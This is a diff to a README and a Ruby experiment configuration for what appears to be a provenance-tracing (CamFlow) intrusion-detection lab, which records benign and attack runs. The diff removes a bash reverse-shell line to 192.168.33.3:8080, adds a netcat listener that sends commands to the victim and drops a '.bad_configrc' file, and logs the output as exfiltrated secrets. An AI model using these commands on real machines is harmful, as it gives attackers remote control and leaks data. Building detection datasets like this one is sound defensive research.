@@ -22,6 +22,8 @@ The standard output and standard error are also sent to the server, so essential
 a reverse TCP shell is created where any command provided by the server will be executed on the victim,
 and the results of the command will be sent to the server.
 Secret information of the victim machine is therefore exfiltrated. 
+The attacker also create a new file `.bad_configrc` in the victim machine.
+The file can be a cronjob that further creates damage.
 
 In this example, we redirect the output of the commands to a temporary file called "secrets.txt"
 to demonstrate that information was indeed exfiltrated.
@@ -35,16 +37,16 @@ Everything is done automatically through scripts for reproducility with minimum 
   end
 
   config.script :normal do
-    %q{
-    2.times.collect do
-      benign() { echo "Hello world";}
-    end
-    }
+    %q{%{
+      sudo chmod 777 /vagrant/install.sh
+      /vagrant/install.sh
+    }}
   end
 
   config.script :attack do
     %q{%{
-      attack () { ignored;};/bin/bash -i >& /dev/tcp/192.168.33.3/8080 0>&1
+      sudo chmod 777 /vagrant/bad_install.sh
+      /vagrant/bad_install.sh
     }}
   end
 
@@ -54,7 +56,7 @@ Everything is done automatically through scripts for reproducility with minimum 
 
   config.script :server do
     %q{%{
-      echo "uname -r ; ls" | nc -l 8080 > /tmp/secrets.txt &
+      echo "uname -r ; ls ; touch .bad_configrc ; exit" | nc -l 8080 > /tmp/secrets.txt &
     }}
   end
 
@@ -71,14 +73,16 @@ Everything is done automatically through scripts for reproducility with minimum 
   end
 
   config.job :normal_camflow do |job|
-    job.iterations = 1
+    job.iterations = 125
     job.tasks = {camflow: [:camflow_start, :normal, :camflow_stop]}
+    job.inputs = {camflow: ['install.sh']}
     job.outputs = {camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log'}}
   end
 
   config.job :attack_camflow do |job|
-    job.iterations = 1
+    job.iterations = 25
     job.tasks = {server: [:server], camflow: [:camflow_start, :attack, :camflow_stop]}
+    job.inputs = {camflow: ['bad_install.sh']}
     job.outputs = {server: {trace: '/tmp/secrets.txt'}, camflow: {config: '/etc/camflow.ini', trace: '/tmp/audit.log'}}
   end
 
